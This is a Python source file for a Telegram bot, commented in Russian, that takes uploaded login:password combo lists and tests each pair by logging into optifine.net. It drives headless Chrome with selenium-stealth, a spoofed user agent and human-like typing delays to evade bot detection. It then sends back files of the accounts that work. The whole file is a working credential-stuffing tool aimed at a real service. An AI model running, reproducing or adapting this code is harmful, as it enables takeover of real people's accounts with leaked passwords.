import os
import sys
import logging
import asyncio
import aiofiles
import time
import random
import subprocess
from datetime import datetime
from typing import Dict, List, Tuple

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
from selenium_stealth import stealth

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

class OptifineChecker:
    """Проверка аккаунтов на Optifine.net с selenium-stealth"""
    
    def __init__(self):
        self.driver = None
        logger.info("🚀 Инициализация OptifineChecker...")
        self.init_driver()
    
    def init_driver(self):
        """Инициализация драйвера с stealth режимом"""
        try:
            chrome_options = Options()
            
            # Основные настройки
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--start-maximized')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--headless=new')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--log-level=3')
            chrome_options.add_argument('--silent')
            
            # User-Agent
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            
            # Путь к ChromeDriver
            driver_path = '/usr/local/bin/chromedriver'
            if os.path.exists(driver_path):
                logger.info(f"✅ Найден ChromeDriver по пути: {driver_path}")
                service = Service(driver_path)
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                logger.info("🔄 Пробую запустить без указания пути...")
                self.driver = webdriver.Chrome(options=chrome_options)
            
            # Применяем stealth
            stealth(self.driver,
                languages=["en-US", "en"],
                vendor="Google Inc.",
                platform="Win32",
                webgl_vendor="Intel Inc.",
                renderer="Intel Iris OpenGL Engine",
                fix_hairline=True,
            )
            
            logger.info("✅ Драйвер успешно инициализирован")
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации драйвера: {e}")
            logger.exception("Детали ошибки:")
            self.driver = None
    
    def human_like_delay(self, min_sec=1, max_sec=3):
        """Человекоподобная задержка"""
        time.sleep(random.uniform(min_sec, max_sec))
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка одного аккаунта через Selenium с полным входом"""
        
        logger.info(f"🔍 Начинаю проверку: {login[:20]}...")
        
        if not self.driver:
            logger.error("❌ Драйвер не инициализирован")
            self.init_driver()
            if not self.driver:
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Драйвер не инициализирован'
                }
        
        try:
            # Переходим на страницу входа
            logger.info(f"🌐 Загружаю страницу входа...")
            self.driver.get("https://optifine.net/login")
            self.human_like_delay(3, 5)
            
            # Сохраняем скриншот
            self.driver.save_screenshot(f"/app/debug/1_login_page_{login[:10]}.png")
            
            # Ищем форму входа
            try:
                # Ждем загрузки страницы
                WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                
                # Ищем поле email/username
                email_field = None
                email_selectors = [
                    "//input[@type='email']",
                    "//input[@name='email']",
                    "//input[@name='username']",
                    "//input[@placeholder*='email']",
                    "//input[@placeholder*='username']",
                    "//input[@id='email']",
                    "//input[@id='username']"
                ]
                
                for selector in email_selectors:
                    try:
                        email_field = WebDriverWait(self.driver, 3).until(
                            EC.presence_of_element_located((By.XPATH, selector))
                        )
                        if email_field.is_displayed():
                            logger.info(f"✅ Найдено поле email: {selector}")
                            break
                    except:
                        continue
                
                if not email_field:
                    logger.warning("❌ Поле email не найдено")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Поле email не найдено'
                    }
                
                # Ищем поле пароля
                password_field = None
                password_selectors = [
                    "//input[@type='password']",
                    "//input[@name='password']",
                    "//input[@placeholder*='password']",
                    "//input[@id='password']"
                ]
                
                for selector in password_selectors:
                    try:
                        password_field = WebDriverWait(self.driver, 3).until(
                            EC.presence_of_element_located((By.XPATH, selector))
                        )
                        if password_field.is_displayed():
                            logger.info(f"✅ Найдено поле пароля: {selector}")
                            break
                    except:
                        continue
                
                if not password_field:
                    logger.warning("❌ Поле пароля не найдено")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Поле пароля не найдено'
                    }
                
                # Ищем кнопку входа
                submit_button = None
                submit_selectors = [
                    "//button[@type='submit']",
                    "//input[@type='submit']",
                    "//button[contains(text(), 'Login')]",
                    "//button[contains(text(), 'Sign in')]",
                    "//button[contains(text(), 'Log in')]",
                    "//button[contains(text(), 'Войти')]"
                ]
                
                for selector in submit_selectors:
                    try:
                        submit_button = WebDriverWait(self.driver, 3).until(
                            EC.element_to_be_clickable((By.XPATH, selector))
                        )
                        if submit_button.is_displayed():
                            logger.info(f"✅ Найдена кнопка: {selector}")
                            break
                    except:
                        continue
                
                if not submit_button:
                    logger.warning("❌ Кнопка не найдена")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Кнопка не найдена'
                    }
                
                # Вводим email
                logger.info(f"✍️ Ввожу email: {login[:20]}...")
                email_field.clear()
                for char in login:
                    email_field.send_keys(char)
                    time.sleep(random.uniform(0.03, 0.08))
                
                self.human_like_delay(0.5, 1)
                
                # Вводим пароль
                logger.info(f"✍️ Ввожу пароль...")
                password_field.clear()
                for char in password:
                    password_field.send_keys(char)
                    time.sleep(random.uniform(0.03, 0.08))
                
                self.human_like_delay(0.5, 1)
                
                # Сохраняем скриншот перед отправкой
                self.driver.save_screenshot(f"/app/debug/2_before_submit_{login[:10]}.png")
                
                # Нажимаем кнопку
                logger.info("🖱️ Нажимаю кнопку входа")
                submit_button.click()
                
                # Ждем результат
                self.human_like_delay(5, 8)
                
                # Сохраняем результат
                self.driver.save_screenshot(f"/app/debug/3_after_submit_{login[:10]}.png")
                
                # Анализируем результат
                current_url = self.driver.current_url
                page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
                
                logger.info(f"📌 URL после входа: {current_url}")
                
                # Критерии успеха
                success_indicators = [
                    'dashboard', 'profile', 'account', 'welcome', 
                    'logout', 'log out', 'my account', 'downloads'
                ]
                
                # Критерии ошибки
                error_indicators = [
                    'invalid', 'incorrect', 'wrong', 'error', 
                    'failed', 'not found', 'try again'
                ]
                
                # Проверяем успешность
                if any(indicator in current_url.lower() for indicator in ['dashboard', 'profile', 'account']):
                    logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                    return {
                        'login': login,
                        'password': password,
                        'status': 'valid',
                        'method': 'login_success'
                    }
                
                if any(indicator in page_text for indicator in success_indicators):
                    logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                    return {
                        'login': login,
                        'password': password,
                        'status': 'valid',
                        'method': 'login_success'
                    }
                
                if any(indicator in page_text for indicator in error_indicators):
                    logger.info(f"❌ Неверный: {login[:20]}")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Неверный логин/пароль'
                    }
                
                # Если неопределенный результат
                logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Неопределенный результат'
                }
                
            except Exception as e:
                logger.error(f"❌ Ошибка при входе: {e}")
                return {
                    'login': login,
                    'status': 'error',
                    'error': str(e)[:50]
                }
            
        except Exception as e:
            logger.error(f"❌ Ошибка при проверке {login[:20]}: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:50]
            }
    
    def close(self):
        """Закрытие драйвера"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info("✅ Драйвер закрыт")
            except:
                pass

# Создаем директорию для отладки
os.makedirs('/app/debug', exist_ok=True)

# Создаем экземпляр
logger.info("🚀 Создание экземпляра OptifineChecker...")
checker = OptifineChecker()

async def process_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    
    results = {
        'valid': [],
        'invalid': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🚀 **Запускаю проверку Optifine.net...**\n"
        "⏳ Пожалуйста, подождите"
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            for sep in [':', ';', '|', '\t']:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Начинаю проверку...**"
        )
        
        start_time = time.time()
        
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
                    f"🔄 **Проверяю:** {login[:15]}..."
                )
            
            # Проверка аккаунта
            result = await checker.check_account(login, password)
            
            # Сортируем результаты
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
                logger.info(f"✅ РАБОЧИЙ: {login[:20]}")
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"⚠️ ОШИБКА: {login[:20]} - {result.get('error')}")
            
            bot_stats['total'] += 1
            
            # Задержка между запросами
            await asyncio.sleep(2)
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Файл с рабочими
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        # Файл с нерабочими
        if results['invalid']:
            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
                for acc in results['invalid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"❌ **Нерабочих: {len(results['invalid'])}**"
                )
            os.remove(invalid_file)
        
        # Файл с ошибками
        if results['errors']:
            error_file = f"⚠️_ОШИБКИ_{len(results['errors'])}шт_{timestamp}.txt"
            async with aiofiles.open(error_file, 'w', encoding='utf-8') as f:
                for acc in results['errors']:
                    await f.write(f"{acc['login']}:{acc['password']} | {acc.get('error', 'unknown')}\n")
            
            with open(error_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=error_file,
                    caption=f"⚠️ **Ошибок: {len(results['errors'])}**"
                )
            os.remove(error_file)
        
        # Итог
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• ❌ Нерабочих: {len(results['invalid'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Optifine Account Checker**\n\n"
        f"🔍 Проверяет аккаунты на optifine.net\n"
        f"📊 **Статистика:**\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено рабочих: {bot_stats['valid']}\n\n"
        f"📥 **Отправь .txt файл** с логинами и паролями\n"
        f"Формат: логин:пароль (каждый с новой строки)\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего проверено: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Нерабочих: {bot_stats['invalid']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n\n"
            "📌 **Пример:**\n"
            "`user@mail.com:password123`\n"
            "`player123:qwerty456`\n\n"
            "⚡️ **Результат:**\n"
            "• ✅ рабочие аккаунты\n"
            "• ❌ нерабочие аккаунты\n"
            "• ⚠️ ошибки проверки"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(f"❌ **Файл > 10 МБ**")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Запускаю проверку...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER")
    print("=" * 50)
    print(f"📁 Директория отладки: /app/debug")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    print("=" * 50)
    
    try:
        app.run_polling()
    except Exception as e:
        logger.error(f"Ошибка: {e}")
    finally:
        if checker:
            checker.close()

if __name__ == '__main__':
    main()